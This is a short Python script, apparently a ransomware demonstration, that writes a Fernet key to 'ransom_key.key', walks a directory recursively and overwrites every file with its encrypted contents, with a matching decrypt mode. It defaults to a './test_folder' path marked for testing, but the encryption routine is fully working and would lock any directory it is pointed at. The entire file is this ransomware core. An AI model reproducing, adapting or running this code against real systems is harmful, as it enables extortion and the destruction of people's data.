import os
from cryptography.fernet import Fernet

# Generate encryption key
def generate_key():
    key = Fernet.generate_key()
    with open("ransom_key.key", "wb") as key_file:
        key_file.write(key)

# Load the encryption key
def load_key():
    return open("ransom_key.key", "rb").read()

# Encrypt files in a directory
def encrypt_files(directory, key):
    fernet = Fernet(key)
    for root, dirs, files in os.walk(directory):
        for file in files:
            filepath = os.path.join(root, file)
            try:
                # Read and encrypt file content
                with open(filepath, "rb") as f:
                    data = f.read()
                encrypted_data = fernet.encrypt(data)
                with open(filepath, "wb") as f:
                    f.write(encrypted_data)
                print(f"Encrypted: {filepath}")
            except Exception as e:
                print(f"Failed to encrypt {filepath}: {e}")

# Decrypt files in a directory
def decrypt_files(directory, key):
    fernet = Fernet(key)
    for root, dirs, files in os.walk(directory):
        for file in files:
            filepath = os.path.join(root, file)
            try:
                # Read and decrypt file content
                with open(filepath, "rb") as f:
                    data = f.read()
                decrypted_data = fernet.decrypt(data)
                with open(filepath, "wb") as f:
                    f.write(decrypted_data)
                print(f"Decrypted: {filepath}")
            except Exception as e:
                print(f"Failed to decrypt {filepath}: {e}")

if __name__ == "__main__":
    target_directory = "./test_folder"  # Adjust for your testing directory
    action = input("Enter 'encrypt' to encrypt or 'decrypt' to decrypt files: ").strip().lower()

    if action == "encrypt":
        generate_key()
        key = load_key()
        encrypt_files(target_directory, key)
        print("Files encrypted. Keep the key safe!")
    elif action == "decrypt":
        key = load_key()
        decrypt_files(target_directory, key)
        print("Files decrypted successfully.")
    else:
        print("Invalid action. Use 'encrypt' or 'decrypt'.")
      
